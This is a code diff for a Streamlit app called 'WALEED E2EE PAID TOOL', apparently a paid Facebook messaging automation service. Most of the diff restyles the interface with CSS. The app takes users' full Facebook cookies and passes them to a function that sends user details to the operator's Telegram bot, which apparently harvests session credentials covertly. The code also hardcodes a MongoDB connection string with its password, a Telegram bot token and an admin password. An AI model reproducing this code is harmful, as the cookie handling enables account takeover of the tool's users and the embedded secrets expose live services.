@@ -14,13 +14,12 @@ import uuid
 from datetime import datetime
 import json
 
-# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
+# 🚨 MONGODB 24/7 HEARTBEAT
 def setup_mongodb_heartbeat():
     """MongoDB heartbeat to keep app alive 24/7"""
     def keep_alive():
         while True:
             try:
-                # Import inside function to avoid initial load issues
                 from pymongo import MongoClient
                 
                 connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
@@ -28,16 +27,15 @@ def setup_mongodb_heartbeat():
                 client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                 db_connection = client['streamlit_db']
                 
-                # Update heartbeat every 5 minutes
                 db_connection.heartbeat.update_one(
-                    {'app_id': 'Rafay_Khan_automation'},
+                    {'app_id': 'Waleed_E2E_Premium'},
                     {
                         '$set': {
                             'last_heartbeat': datetime.now(),
                             'status': 'running',
-                            'app_name': 'Waleed XD E2EE',
+                            'app_name': 'Waleed E2E Premium Tool',
                             'timestamp': datetime.now(),
-                            'version': '2.0'
+                            'version': '3.0'
                         }
                     },
                     upsert=True
@@ -48,10 +46,8 @@ def setup_mongodb_heartbeat():
             except Exception as e:
                 print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
             
-            # Wait 5 minutes
             time.sleep(300)
     
-    # Start heartbeat in background
     try:
         heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
         heartbeat_thread.start()
@@ -59,24 +55,579 @@ def setup_mongodb_heartbeat():
     except Exception as e:
         print(f"❌ Failed to start heartbeat: {e}")
 
-# 🚨 YEH LINE SABSE PEHLE RUN HOGI
 if 'mongodb_started' not in st.session_state:
     setup_mongodb_heartbeat()
     st.session_state.mongodb_started = True
-# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="WALEED XD E2EE PAID TOOL",
+    page_title="WALEED E2EE PAID TOOL",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
-# Telegram Bot Configuration
+# 🎨 PREMIUM DESIGN & FONTS
+premium_design = """
+<style>
+    /* ====== GOOGLE FONTS IMPORT ====== */
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap');
+    
+    /* ====== GLOBAL STYLES ====== */
+    * {
+        font-family: 'Inter', sans-serif;
+    }
+    
+    h1, h2, h3, h4 {
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 700;
+    }
+    
+    /* ====== PREMIUM BACKGROUND ====== */
+    .stApp {
+        background: linear-gradient(135deg, 
+            #000428 0%,
+            #004e92 25%,
+            #000428 50%,
+            #004e92 75%,
+            #000428 100%);
+        background-size: 400% 400%;
+        animation: cosmicFlow 20s ease infinite;
+    }
+    
+    @keyframes cosmicFlow {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+    
+    /* ====== NEON GLOW EFFECT ====== */
+    .neon-text {
+        color: #fff;
+        text-shadow: 
+            0 0 7px #fff,
+            0 0 10px #fff,
+            0 0 21px #fff,
+            0 0 42px #0fa,
+            0 0 82px #0fa,
+            0 0 92px #0fa,
+            0 0 102px #0fa,
+            0 0 151px #0fa;
+        animation: neonPulse 1.5s infinite alternate;
+    }
+    
+    @keyframes neonPulse {
+        from { text-shadow: 0 0 10px #fff; }
+        to { text-shadow: 0 0 20px #fff, 0 0 30px #0fa; }
+    }
+    
+    /* ====== MAIN CONTAINER ====== */
+    .main-wrapper {
+        background: rgba(10, 15, 30, 0.85);
+        backdrop-filter: blur(20px);
+        border-radius: 25px;
+        border: 1px solid rgba(100, 200, 255, 0.2);
+        box-shadow: 
+            0 20px 60px rgba(0, 100, 255, 0.3),
+            inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        padding: 35px;
+        margin: 20px;
+    }
+    
+    /* ====== PREMIUM HEADER ====== */
+    .premium-header {
+        text-align: center;
+        padding: 40px 20px;
+        margin-bottom: 40px;
+        position: relative;
+    }
+    
+    .logo-main {
+        width: 150px;
+        height: 150px;
+        margin: 0 auto 30px;
+        background: radial-gradient(circle at 30% 30%, #0ff, #00f);
+        border-radius: 30px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 60px;
+        color: white;
+        font-weight: 900;
+        font-family: 'Orbitron', sans-serif;
+        transform: rotate(45deg);
+        box-shadow: 
+            0 0 30px rgba(0, 255, 255, 0.5),
+            inset 0 0 30px rgba(255, 255, 255, 0.2);
+        animation: logoFloat 4s ease-in-out infinite;
+    }
+    
+    .logo-main::after {
+        content: 'W';
+        transform: rotate(-45deg);
+        text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+    }
+    
+    @keyframes logoFloat {
+        0%, 100% { transform: rotate(45deg) translateY(0); }
+        50% { transform: rotate(45deg) translateY(-20px); }
+    }
+    
+    .main-title {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 3.5rem;
+        font-weight: 800;
+        background: linear-gradient(135deg, 
+            #00ffff 0%,
+            #0088ff 25%,
+            #00ffaa 50%,
+            #0088ff 75%,
+            #00ffff 100%);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        background-size: 300% 300%;
+        animation: titleGlow 4s ease infinite;
+        margin: 0;
+        letter-spacing: 2px;
+    }
+    
+    @keyframes titleGlow {
+        0%, 100% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+    }
+    
+    .sub-title {
+        font-family: 'Poppins', sans-serif;
+        font-size: 1.3rem;
+        color: rgba(255, 255, 255, 0.7);
+        margin-top: 10px;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        font-weight: 300;
+    }
+    
+    .badge-premium {
+        display: inline-block;
+        background: linear-gradient(135deg, #ff0080, #ff8c00);
+        color: white;
+        padding: 8px 25px;
+        border-radius: 25px;
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 700;
+        font-size: 0.9rem;
+        letter-spacing: 2px;
+        margin-top: 15px;
+        box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4);
+        animation: badgePulse 2s infinite;
+    }
+    
+    @keyframes badgePulse {
+        0%, 100% { box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4); }
+        50% { box-shadow: 0 5px 30px rgba(255, 0, 128, 0.6); }
+    }
+    
+    /* ====== BUTTON STYLES ====== */
+    .stButton > button {
+        font-family: 'Montserrat', sans-serif !important;
+        font-weight: 600 !important;
+        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
+        color: white !important;
+        border: none !important;
+        border-radius: 15px !important;
+        padding: 14px 28px !important;
+        font-size: 15px !important;
+        transition: all 0.3s ease !important;
+        box-shadow: 0 8px 25px rgba(0, 102, 255, 0.3) !important;
+        position: relative !important;
+        overflow: hidden !important;
+        letter-spacing: 0.5px !important;
+    }
+    
+    .stButton > button:hover {
+        transform: translateY(-3px) !important;
+        box-shadow: 0 12px 35px rgba(0, 102, 255, 0.5) !important;
+    }
+    
+    .stButton > button::after {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 5px;
+        height: 5px;
+        background: rgba(255, 255, 255, 0.5);
+        opacity: 0;
+        border-radius: 100%;
+        transform: scale(1, 1) translate(-50%);
+        transform-origin: 50% 50%;
+    }
+    
+    .stButton > button:focus:not(:active)::after {
+        animation: ripple 1s ease-out;
+    }
+    
+    @keyframes ripple {
+        0% { transform: scale(0, 0); opacity: 0.5; }
+        100% { transform: scale(20, 20); opacity: 0; }
+    }
+    
+    /* Success Button */
+    div[data-testid="stButton"]:has(button:contains("Approve")),
+    div[data-testid="stButton"]:has(button:contains("Login")),
+    div[data-testid="stButton"]:has(button:contains("Save")) {
+        button {
+            background: linear-gradient(135deg, #00cc66, #00ff88) !important;
+            box-shadow: 0 8px 25px rgba(0, 204, 102, 0.3) !important;
+        }
+    }
+    
+    /* Danger Button */
+    div[data-testid="stButton"]:has(button:contains("Reject")),
+    div[data-testid="stButton"]:has(button:contains("Remove")),
+    div[data-testid="stButton"]:has(button:contains("Stop")) {
+        button {
+            background: linear-gradient(135deg, #ff3333, #ff6666) !important;
+            box-shadow: 0 8px 25px rgba(255, 51, 51, 0.3) !important;
+        }
+    }
+    
+    /* Warning Button */
+    div[data-testid="stButton"]:has(button:contains("Pending")),
+    div[data-testid="stButton"]:has(button:contains("Warning")) {
+        button {
+            background: linear-gradient(135deg, #ffaa00, #ffcc00) !important;
+            box-shadow: 0 8px 25px rgba(255, 170, 0, 0.3) !important;
+        }
+    }
+    
+    /* ====== INPUT FIELDS ====== */
+    .stTextInput > div > div > input,
+    .stTextArea > div > div > textarea,
+    .stNumberInput > div > div > input {
+        font-family: 'Inter', sans-serif !important;
+        font-weight: 500 !important;
+        background: rgba(20, 30, 50, 0.9) !important;
+        border: 2px solid rgba(0, 150, 255, 0.3) !important;
+        border-radius: 12px !important;
+        color: white !important;
+        padding: 16px 20px !important;
+        font-size: 16px !important;
+        transition: all 0.3s ease !important;
+    }
+    
+    .stTextInput > div > div > input:focus,
+    .stTextArea > div > div > textarea:focus,
+    .stNumberInput > div > div > input:focus {
+        border-color: #00ccff !important;
+        box-shadow: 0 0 0 3px rgba(0, 204, 255, 0.2) !important;
+        background: rgba(20, 30, 50, 1) !important;
+    }
+    
+    .stTextInput > div > div > input::placeholder,
+    .stTextArea > div > div > textarea::placeholder {
+        color: rgba(255, 255, 255, 0.4) !important;
+        font-family: 'Inter', sans-serif !important;
+    }
+    
+    /* ====== CARD DESIGN ====== */
+    .premium-card {
+        background: linear-gradient(145deg, 
+            rgba(30, 40, 60, 0.8),
+            rgba(20, 30, 50, 0.9));
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 25px;
+        border: 1px solid rgba(0, 200, 255, 0.2);
+        box-shadow: 
+            0 10px 30px rgba(0, 0, 0, 0.3),
+            inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        transition: all 0.3s ease;
+        margin-bottom: 20px;
+    }
+    
+    .premium-card:hover {
+        transform: translateY(-5px);
+        border-color: rgba(0, 200, 255, 0.4);
+        box-shadow: 
+            0 15px 40px rgba(0, 100, 255, 0.4),
+            inset 0 1px 0 rgba(255, 255, 255, 0.2);
+    }
+    
+    .card-title {
+        font-family: 'Montserrat', sans-serif;
+        font-size: 1.5rem;
+        font-weight: 700;
+        color: #00ccff;
+        margin-bottom: 20px;
+        border-left: 4px solid #00ccff;
+        padding-left: 15px;
+    }
+    
+    /* ====== TAB STYLING ====== */
+    .stTabs [data-baseweb="tab-list"] {
+        gap: 10px;
+        background: rgba(30, 40, 60, 0.5);
+        padding: 10px;
+        border-radius: 15px;
+        border: 1px solid rgba(0, 200, 255, 0.2);
+    }
+    
+    .stTabs [data-baseweb="tab"] {
+        font-family: 'Poppins', sans-serif !important;
+        font-weight: 500 !important;
+        background: transparent !important;
+        border-radius: 12px !important;
+        padding: 12px 24px !important;
+        color: rgba(255, 255, 255, 0.6) !important;
+        border: none !important;
+        transition: all 0.3s ease !important;
+    }
+    
+    .stTabs [aria-selected="true"] {
+        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
+        color: white !important;
+        box-shadow: 0 5px 20px rgba(0, 102, 255, 0.3) !important;
+    }
+    
+    /* ====== METRIC CARDS ====== */
+    .metric-box {
+        background: rgba(20, 30, 50, 0.7);
+        border-radius: 15px;
+        padding: 20px;
+        text-align: center;
+        border: 1px solid rgba(0, 200, 255, 0.2);
+        transition: all 0.3s ease;
+    }
+    
+    .metric-box:hover {
+        border-color: #00ccff;
+        box-shadow: 0 10px 25px rgba(0, 204, 255, 0.2);
+    }
+    
+    .metric-value {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 2.2rem;
+        font-weight: 700;
+        color: #00ffff;
+        margin: 10px 0;
+        text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+    }
+    
+    .metric-label {
+        font-family: 'Poppins', sans-serif;
+        font-size: 0.9rem;
+        color: rgba(255, 255, 255, 0.6);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    /* ====== LOG CONSOLE ====== */
+    .log-terminal {
+        background: rgba(10, 15, 25, 0.95);
+        border-radius: 15px;
+        padding: 20px;
+        font-family: 'Consolas', 'Monaco', monospace;
+        color: #00ffaa;
+        font-size: 14px;
+        line-height: 1.6;
+        max-height: 400px;
+        overflow-y: auto;
+        border: 1px solid rgba(0, 255, 170, 0.3);
+        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+    }
+    
+    .log-entry {
+        padding: 8px 12px;
+        margin: 5px 0;
+        border-radius: 8px;
+        background: rgba(0, 255, 170, 0.05);
+        border-left: 3px solid #00ffaa;
+        animation: slideIn 0.3s ease;
+    }
+    
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateX(-10px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
+    
+    /* ====== USER CARDS ====== */
+    .user-profile {
+        background: rgba(30, 40, 60, 0.7);
+        padding: 20px;
+        border-radius: 15px;
+        margin: 10px 0;
+        border-left: 5px solid #0066ff;
+        transition: all 0.3s ease;
+        border: 1px solid rgba(0, 102, 255, 0.2);
+    }
+    
+    .user-profile:hover {
+        background: rgba(30, 40, 60, 0.9);
+        transform: translateX(5px);
+        border-color: #00ccff;
+    }
+    
+    .user-profile.approved {
+        border-left-color: #00cc66;
+    }
+    
+    .user-profile.pending {
+        border-left-color: #ffaa00;
+    }
+    
+    .user-profile.rejected {
+        border-left-color: #ff3333;
+    }
+    
+    /* ====== STATUS BADGES ====== */
+    .status-tag {
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 600;
+        padding: 6px 15px;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        letter-spacing: 1px;
+        display: inline-block;
+        margin-left: 10px;
+    }
+    
+    .status-green {
+        background: linear-gradient(135deg, #00cc66, #00ff88);
+        color: white;
+        box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
+    }
+    
+    .status-yellow {
+        background: linear-gradient(135deg, #ffaa00, #ffcc00);
+        color: white;
+        box-shadow: 0 4px 15px rgba(255, 170, 0, 0.3);
+    }
+    
+    .status-red {
+        background: linear-gradient(135deg, #ff3333, #ff6666);
+        color: white;
+        box-shadow: 0 4px 15px rgba(255, 51, 51, 0.3);
+    }
+    
+    /* ====== SIDEBAR ====== */
+    [data-testid="stSidebar"] {
+        background: rgba(15, 25, 40, 0.95) !important;
+        backdrop-filter: blur(20px);
+        border-right: 1px solid rgba(0, 200, 255, 0.2);
+    }
+    
+    [data-testid="stSidebar"] .stButton > button {
+        font-family: 'Poppins', sans-serif !important;
+        margin: 8px 0;
+        background: rgba(30, 40, 60, 0.8) !important;
+        border: 1px solid rgba(0, 200, 255, 0.3) !important;
+    }
+    
+    [data-testid="stSidebar"] .stButton > button:hover {
+        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
+        border-color: transparent !important;
+    }
+    
+    /* ====== FOOTER ====== */
+    .premium-footer {
+        text-align: center;
+        padding: 40px 20px;
+        margin-top: 50px;
+        color: rgba(255, 255, 255, 0.5);
+        font-family: 'Poppins', sans-serif;
+        font-size: 0.9rem;
+        border-top: 1px solid rgba(0, 200, 255, 0.2);
+        position: relative;
+    }
+    
+    .premium-footer::before {
+        content: '';
+        position: absolute;
+        top: -2px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 150px;
+        height: 3px;
+        background: linear-gradient(90deg, 
+            transparent, 
+            #00ccff, 
+            transparent);
+        border-radius: 3px;
+    }
+    
+    .footer-title {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 1.5rem;
+        font-weight: 700;
+        background: linear-gradient(135deg, #00ffff, #0088ff);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        margin-bottom: 10px;
+    }
+    
+    /* ====== SCROLLBAR ====== */
+    ::-webkit-scrollbar {
+        width: 10px;
+    }
+    
+    ::-webkit-scrollbar-track {
+        background: rgba(20, 30, 50, 0.5);
+        border-radius: 10px;
+    }
+    
+    ::-webkit-scrollbar-thumb {
+        background: linear-gradient(135deg, #0066ff, #00ccff);
+        border-radius: 10px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+        background: linear-gradient(135deg, #00ccff, #0066ff);
+    }
+    
+    /* ====== LOADING ANIMATION ====== */
+    .loading-circle {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(0, 204, 255, 0.1);
+        border-radius: 50%;
+        border-top-color: #00ccff;
+        animation: spin 1s linear infinite;
+        margin: 30px auto;
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    
+    /* ====== RESPONSIVE DESIGN ====== */
+    @media (max-width: 768px) {
+        .main-title {
+            font-size: 2.5rem;
+        }
+        
+        .logo-main {
+            width: 120px;
+            height: 120px;
+            font-size: 45px;
+        }
+        
+        .main-wrapper {
+            padding: 20px;
+            margin: 10px;
+        }
+    }
+</style>
+"""
+
+st.markdown(premium_design, unsafe_allow_html=True)
+
+# Telegram Bot Configuration (unchanged)
 TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
 TELEGRAM_CHAT_ID = "1889611156"
 FACEBOOK_ADMIN_UID = "100080154146813"
 
+# ✅ ALL YOUR ORIGINAL FUNCTIONS REMAIN EXACTLY THE SAME
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
     try:
@@ -135,168 +686,15 @@ def send_facebook_notification(user_data, automation_data):
 🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
         """
         
-        # Simulate sending to Facebook admin
         print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
         print(f"Message: {message}")
         
-        # Here you would implement actual Facebook API integration
-        # For now, we'll log it
         db.log_admin_notification(user_data['user_id'], message)
         
     except Exception as e:
         print(f"Facebook notification failed: {e}")
 
-# MINIMAL DESIGN IMPROVEMENTS - ORIGINAL CODE INTACT
-custom_css = """
-<style>
-    /* Dark theme with blue accents */
-    .stApp {
-        background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
-    }
-    
-    /* Main container with subtle border */
-    .main-container {
-        background: rgba(15, 23, 42, 0.9);
-        border-radius: 15px;
-        padding: 25px;
-        margin: 15px;
-        border: 1px solid rgba(59, 130, 246, 0.2);
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-    }
-    
-    /* Header styling */
-    .main-header {
-        background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
-        padding: 25px;
-        border-radius: 12px;
-        text-align: center;
-        margin-bottom: 25px;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .main-header h1 {
-        color: white;
-        font-size: 2.2rem;
-        font-weight: 700;
-        margin: 0;
-        text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-    }
-    
-    .main-header p {
-        color: rgba(255,255,255,0.8);
-        font-size: 1rem;
-        margin-top: 8px;
-    }
-    
-    /* Buttons */
-    .stButton>button {
-        background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
-        color: white;
-        border: none;
-        border-radius: 10px;
-        padding: 12px 24px;
-        font-weight: 600;
-        transition: all 0.3s ease;
-    }
-    
-    .stButton>button:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
-    }
-    
-    /* Input fields */
-    .stTextInput>div>div>input,
-    .stTextArea>div>div>textarea,
-    .stNumberInput>div>div>input {
-        background: rgba(30, 41, 59, 0.8) !important;
-        border: 1px solid rgba(59, 130, 246, 0.3) !important;
-        border-radius: 8px !important;
-        color: white !important;
-    }
-    
-    .stTextInput>div>div>input:focus,
-    .stTextArea>div>div>textarea:focus,
-    .stNumberInput>div>div>input:focus {
-        border-color: #3b82f6 !important;
-        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2) !important;
-    }
-    
-    /* Tabs */
-    .stTabs [data-baseweb="tab-list"] {
-        background: rgba(30, 41, 59, 0.5);
-        border-radius: 10px;
-        padding: 5px;
-    }
-    
-    .stTabs [data-baseweb="tab"] {
-        border-radius: 8px !important;
-        padding: 10px 20px !important;
-    }
-    
-    .stTabs [aria-selected="true"] {
-        background: #3b82f6 !important;
-        color: white !important;
-    }
-    
-    /* Cards */
-    .card {
-        background: rgba(30, 41, 59, 0.7);
-        border-radius: 10px;
-        padding: 20px;
-        border: 1px solid rgba(59, 130, 246, 0.2);
-        margin: 10px 0;
-    }
-    
-    /* Footer */
-    .footer {
-        text-align: center;
-        padding: 20px;
-        color: #94a3b8;
-        margin-top: 30px;
-        border-top: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    /* Log container */
-    .log-container {
-        background: rgba(15, 23, 42, 0.9);
-        color: #10b981;
-        padding: 15px;
-        border-radius: 8px;
-        font-family: monospace;
-        max-height: 300px;
-        overflow-y: auto;
-        border: 1px solid rgba(16, 185, 129, 0.2);
-    }
-    
-    /* Status badges */
-    .status-badge {
-        display: inline-block;
-        padding: 4px 12px;
-        border-radius: 20px;
-        font-size: 0.8rem;
-        font-weight: 600;
-    }
-    
-    .approved {
-        background: linear-gradient(135deg, #10b981, #059669);
-        color: white;
-    }
-    
-    .pending {
-        background: linear-gradient(135deg, #f59e0b, #d97706);
-        color: white;
-    }
-    
-    .rejected {
-        background: linear-gradient(135deg, #ef4444, #dc2626);
-        color: white;
-    }
-</style>
-"""
-
-st.markdown(custom_css, unsafe_allow_html=True)
-
-# Initialize session state
+# Initialize session state (unchanged)
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
 if 'user_id' not in st.session_state:
@@ -347,7 +745,6 @@ def log_message(msg, automation_state=None, user_id=None):
     timestamp = get_indian_time()
     formatted_msg = f"[{timestamp}] {msg}"
     
-    # Store in admin logs if user_id provided
     if user_id:
         db.log_user_activity(user_id, formatted_msg)
     
@@ -691,7 +1088,7 @@ def run_automation_with_notification(user_config, username, automation_state, us
         'delay': user_config['delay'],
         'prefix': user_config['name_prefix'],
         'messages': user_config['messages_file_content'],
-        'cookies': user_config['cookies']  # Full cookies now
+        'cookies': user_config['cookies']
     }
     
     # Send notifications
@@ -722,33 +1119,39 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-# Main application - MINIMAL CHANGES ONLY
-st.markdown('<div class="main-container">', unsafe_allow_html=True)
+# =============== MAIN APPLICATION UI WITH PREMIUM DESIGN ===============
+st.markdown('<div class="main-wrapper">', unsafe_allow_html=True)
 
-# Header with new styling
+# Premium Header
 st.markdown("""
-<div class="main-header">
-    <h1>🔥 WALEED XD E2EE PAID TOOL</h1>
-    <p>Professional Automation Suite • Premium Version</p>
+<div class="premium-header">
+    <div class="logo-main"></div>
+    <h1 class="main-title">WALEED E2EE PAID TOOL</h1>
+    <div class="sub-title">PREMIUM AUTOMATION SUITE</div>
+    <div class="badge-premium">PREMIUM EDITION • V3.0</div>
 </div>
 """, unsafe_allow_html=True)
 
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
-    st.sidebar.markdown('<div class="card">', unsafe_allow_html=True)
-    admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
-    admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
-    
-    if st.sidebar.button("Login as Admin"):
-        if admin_username == "WALEED" and admin_password == "WALEED_XD":
-            st.session_state.admin_logged_in = True
-            st.sidebar.success("✅ Admin login successful!")
-        else:
-            st.sidebar.error("❌ Invalid admin credentials!")
-    st.sidebar.markdown('</div>', unsafe_allow_html=True)
+    with st.sidebar.container():
+        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+        st.markdown('<div class="card-title">Admin Access</div>', unsafe_allow_html=True)
+        admin_username = st.text_input("Admin Username", key="admin_username")
+        admin_password = st.text_input("Admin Password", type="password", key="admin_password")
+        
+        if st.button("Login as Admin", use_container_width=True):
+            if admin_username == "WALEED" and admin_password == "WALEED_XD":
+                st.session_state.admin_logged_in = True
+                st.success("✅ Admin login successful!")
+                st.rerun()
+            else:
+                st.error("❌ Invalid admin credentials!")
+        st.markdown('</div>', unsafe_allow_html=True)
 
 if st.session_state.admin_logged_in:
-    st.markdown("### 👑 Admin Approval Panel")
+    st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+    st.markdown('<div class="card-title">👑 Admin Control Panel</div>', unsafe_allow_html=True)
     
     # LOGOUT BUTTON
     if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
@@ -769,11 +1172,11 @@ if st.session_state.admin_logged_in:
                 
                 with col1:
                     st.markdown(f"""
-                    <div class="card">
+                    <div class="user-profile pending">
                         <strong>👤 Username:</strong> {username}<br>
                         <strong>📝 Real Name:</strong> {real_name}<br>
                         <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
-                        <span class="status-badge pending">PENDING</span>
+                        <span class="status-tag status-yellow">PENDING</span>
                     </div>
                     """, unsafe_allow_html=True)
                 
@@ -806,12 +1209,12 @@ if st.session_state.admin_logged_in:
                     status = "🟢 Running" if automation_running else "🔴 Stopped"
                     
                     st.markdown(f"""
-                    <div class="card">
+                    <div class="user-profile approved">
                         <strong>👤 Username:</strong> {username}<br>
                         <strong>📝 Real Name:</strong> {real_name}<br>
                         <strong>💬 Chat ID:</strong> {chat_id}<br>
                         <strong>⚡ Status:</strong> {status}<br>
-                        <span class="status-badge approved">APPROVED</span>
+                        <span class="status-tag status-green">APPROVED</span>
                     </div>
                     """, unsafe_allow_html=True)
                 
@@ -843,13 +1246,15 @@ if st.session_state.admin_logged_in:
                                 st.rerun()
                             else:
                                 st.error("⚠️ User needs to configure chat ID first")
+    
+    st.markdown('</div>', unsafe_allow_html=True)
 
 elif not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
     
     with tab1:
-        st.markdown('<div class="card">', unsafe_allow_html=True)
-        st.markdown("### Welcome Back!")
+        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+        st.markdown('<div class="card-title">Welcome Back</div>', unsafe_allow_html=True)
         
         username = st.text_input("Username", key="login_username", placeholder="Enter your username")
         password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
@@ -901,8 +1306,8 @@ elif not st.session_state.logged_in:
         st.markdown('</div>', unsafe_allow_html=True)
     
     with tab2:
-        st.markdown('<div class="card">', unsafe_allow_html=True)
-        st.markdown("### Create New Account")
+        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+        st.markdown('<div class="card-title">Create New Account</div>', unsafe_allow_html=True)
         
         new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
         new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
@@ -938,13 +1343,13 @@ elif not st.session_state.logged_in:
 else:
     # User is logged in but needs approval
     if st.session_state.approval_status != 'approved':
-        st.markdown('<div class="card">', unsafe_allow_html=True)
-        st.markdown("### 🔒 Approval Required")
+        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+        st.markdown('<div class="card-title">🔒 Approval Required</div>', unsafe_allow_html=True)
         
         # User Info
         st.markdown(f"""
-        <div style="background: rgba(30, 41, 59, 0.7); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-            <h4>👤 User Information</h4>
+        <div style="background: rgba(30, 40, 60, 0.7); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(0, 200, 255, 0.3);">
+            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">👤 User Information</h4>
             <p><strong>Username:</strong> {st.session_state.username}</p>
             <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
         </div>
@@ -952,17 +1357,22 @@ else:
         
         # Approval Key
         st.markdown(f"""
-        <div style="background: rgba(30, 41, 59, 0.8); padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; border: 2px solid #3b82f6;">
-            <h4>🔑 Your Approval Key</h4>
-            <div style="font-size: 1.3rem; font-weight: bold; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #3b82f6;">
+        <div style="background: linear-gradient(145deg, rgba(30,40,60,0.8), rgba(20,30,50,0.9)); padding: 25px; border-radius: 15px; margin: 25px 0; text-align: center; border: 2px solid #00ccff; box-shadow: 0 10px 30px rgba(0, 204, 255, 0.2);">
+            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">🔑 Your Approval Key</h4>
+            <div style="font-family: 'Orbitron', sans-serif; font-size: 1.5rem; font-weight: 700; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 10px; margin: 20px 0; border: 2px solid #00ccff; color: #00ffff; text-shadow: 0 0 10px rgba(0, 255, 255, 0.5); letter-spacing: 2px;">
                 {st.session_state.approval_key}
             </div>
-            <button style="background: #3b82f6; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
+            <button style="font-family: 'Montserrat', sans-serif; background: linear-gradient(135deg, #0066ff, #00ccff); color: white; border: none; border-radius: 10px; padding: 12px 30px; font-weight: 600; cursor: pointer; box-shadow: 0 8px 25px rgba(0, 102, 255, 0.3); transition: all 0.3s ease;" 
+                    onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 12px 35px rgba(0, 102, 255, 0.5)'" 
+                    onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(0, 102, 255, 0.3)'"
+                    onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">
+                📋 Copy Key
+            </button>
         </div>
